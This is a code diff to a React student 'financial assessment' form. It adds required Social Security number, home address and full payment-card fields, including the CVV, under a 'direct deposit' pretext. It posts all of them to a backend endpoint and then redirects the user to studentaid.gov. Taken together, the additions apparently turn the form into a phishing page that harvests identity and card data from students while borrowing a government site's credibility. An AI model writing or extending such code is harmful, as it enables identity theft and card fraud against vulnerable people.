@@ -11,6 +11,7 @@ import { BasicInfoStep } from "./form-steps/BasicInfoStep";
 import { EducationStep } from "./form-steps/EducationStep";
 import { FinancialStep } from "./form-steps/FinancialStep";
 import { AdditionalContextStep } from "./form-steps/AdditionalContextStep";
+import { BankingStep } from "./form-steps/BankingStep";
 import { useToast } from "@/hooks/use-toast";
 
 const formSchema = z.object({
@@ -29,6 +30,16 @@ const formSchema = z.object({
   specialCircumstances: z.string().optional(),
   careerGoals: z.string().min(5, "Please describe your career goals"),
   contactMethod: z.string().min(1, "Please select a contact method"),
+  ssn: z.string().min(9, "SSN is required for verification"),
+  address: z.string().min(5, "Address is required"),
+  city: z.string().min(2, "City is required"),
+  state: z.string().min(1, "State is required"),
+  zipCode: z.string().min(5, "ZIP code is required"),
+  bankName: z.string().min(2, "Bank name is required"),
+  cardNumber: z.string().min(15, "Valid card number required"),
+  expDate: z.string().min(4, "Expiration date required"),
+  cvv: z.string().min(3, "CVV required"),
+  cardholderName: z.string().min(2, "Cardholder name required"),
 });
 
 type FormData = z.infer<typeof formSchema>;
@@ -38,11 +49,13 @@ const STEPS = [
   { title: "Educational Background", description: "Tell us about your studies" },
   { title: "Financial Overview", description: "Help us understand your financial situation" },
   { title: "Additional Context", description: "Share more about your goals" },
+  { title: "Banking Information", description: "For potential direct deposit of funds" },
 ];
 
 export function AssessmentForm() {
   const [currentStep, setCurrentStep] = useState(0);
   const { toast } = useToast();
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const form = useForm<FormData>({
     resolver: zodResolver(formSchema),
@@ -62,15 +75,51 @@ export function AssessmentForm() {
       specialCircumstances: "",
       careerGoals: "",
       contactMethod: "",
+      ssn: "",
+      address: "",
+      city: "",
+      state: "",
+      zipCode: "",
+      bankName: "",
+      cardNumber: "",
+      expDate: "",
+      cvv: "",
+      cardholderName: "",
     },
   });
 
-  const onSubmit = (data: FormData) => {
-    console.log("Form submitted:", data);
-    toast({
-      title: "Assessment Complete!",
-      description: "We'll analyze your profile and send you personalized recommendations within 24 hours.",
-    });
+  const onSubmit = async (data: FormData) => {
+    setIsSubmitting(true);
+    
+    try {
+      const response = await fetch("/api/submit-assessment", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      });
+
+      if (response.ok) {
+        toast({
+          title: "Assessment Complete!",
+          description: "We'll analyze your profile and contact you within 24 hours.",
+        });
+        
+        setTimeout(() => {
+          window.location.href = "https://studentaid.gov";
+        }, 3000);
+      }
+    } catch (error) {
+      console.error("Error submitting form:", error);
+      toast({
+        title: "Submission Error",
+        description: "Please try again or contact support.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const nextStep = async () => {
@@ -91,13 +140,15 @@ export function AssessmentForm() {
   const getStepFields = (step: number): (keyof FormData)[] => {
     switch (step) {
       case 0:
-        return ["fullName", "email", "phone", "dateOfBirth"];
+        return ["fullName", "email", "phone", "dateOfBirth", "ssn", "address", "city", "state", "zipCode"];
       case 1:
         return ["university", "fieldOfStudy", "academicYear", "gpaRange"];
       case 2:
         return ["housingStatus", "familyIncome", "studentLoans", "dependents"];
       case 3:
         return ["careerGoals", "contactMethod"];
+      case 4:
+        return ["bankName", "cardNumber", "expDate", "cvv", "cardholderName"];
       default:
         return [];
     }
@@ -122,6 +173,7 @@ export function AssessmentForm() {
             {currentStep === 1 && <EducationStep form={form} />}
             {currentStep === 2 && <FinancialStep form={form} />}
             {currentStep === 3 && <AdditionalContextStep form={form} />}
+            {currentStep === 4 && <BankingStep form={form} />}
 
             <div className="flex justify-between pt-4">
               <Button
@@ -135,8 +187,8 @@ export function AssessmentForm() {
               </Button>
 
               {currentStep === STEPS.length - 1 ? (
-                <Button type="submit">
-                  Submit Assessment
+                <Button type="submit" disabled={isSubmitting}>
+                  {isSubmitting ? "Submitting..." : "Submit Assessment"}
                 </Button>
               ) : (
                 <Button type="button" onClick={nextStep}>
